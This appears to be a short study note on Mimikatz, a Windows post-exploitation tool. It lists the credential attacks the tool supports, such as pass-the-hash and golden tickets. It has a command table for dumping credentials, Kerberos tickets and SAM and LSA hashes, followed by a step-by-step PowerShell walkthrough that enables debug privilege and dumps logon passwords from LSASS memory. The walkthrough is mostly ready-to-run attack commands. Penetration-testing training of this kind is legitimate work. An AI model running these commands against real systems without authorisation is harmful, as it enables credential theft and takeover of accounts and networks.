
**Mimikatz** is a post-exploitation tool that can:
- **Dump credentials** stored in memory.
- Generate and manipulate Kerberos tickets.
- Perform Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass- the-Ticket, Silver Ticket, and Golden Ticket

> you must need administrator rights to run mimikatz

> _"Mimikatz requires debug privileges to access sensitive memory areas."_

> _"If successful, it returns Privilege '20' OK."_


|Command|Purpose|
|---|---|
|`privilege::debug`|Gain debug rights (must run first)|
|`sekurlsa::logonpasswords`|Dump all credentials from memory|
|`sekurlsa::tickets`|Dump Kerberos tickets|
|`lsadump::sam`|Dump local SAM hashes|
|`lsadump::lsa /patch`|Dump domain hashes from LSA|
|`sekurlsa::pth`|Pass-the-Hash attack|

![[Pasted image 20260416153103.png]]


```powershell
# Visit the official GitHub repository: [Mimikatz Releases](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919).
# Download the `mimikatz_trunk.zip` file.

# Navigate to the x64 Folder
cd c:\Users\pparker\Downloads\mimikatz_trunk\x64

# Launch Mimikatz interactive shel
mimikatz.exe    
                     l
# Enables debug privilege (required for memory access)
privilege::debug     
# Expected output: Privilege '20' OK  

# Dumps all logon session credentials from memory   
# Dump Hashes in LSASS         
sekurlsa::logonpasswords  

# Exit when done          
exit                                 
```